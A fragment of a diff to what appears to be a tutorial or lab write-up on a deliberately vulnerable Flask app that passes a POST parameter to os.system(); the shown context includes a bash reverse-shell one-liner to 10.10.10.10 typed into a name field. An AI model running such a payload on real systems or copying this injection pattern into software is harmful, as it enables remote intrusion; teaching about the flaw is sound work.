@@ -48,9 +48,13 @@ What is your name?: bash -i >& /dev/tcp/10.10.10.10/9999 0>&1
 The following code accepts user input from the public and passes it to os.system(), allowing the web application to be vulnerable to code execution
 
 Flask - Micro web framework written that allows the web app to function
+
 /api - Web application route. Location of the paramater that accepts user input
+
 POST - Enforces the paramater to only accept user input via a HTTP POST request
+
 os.system() - Function that enables the web application to interact with the underlying OS
+
 request - Paramater that accepts user input , wrapped around os.system(), allowing code execution
 
 Interacting with the web app
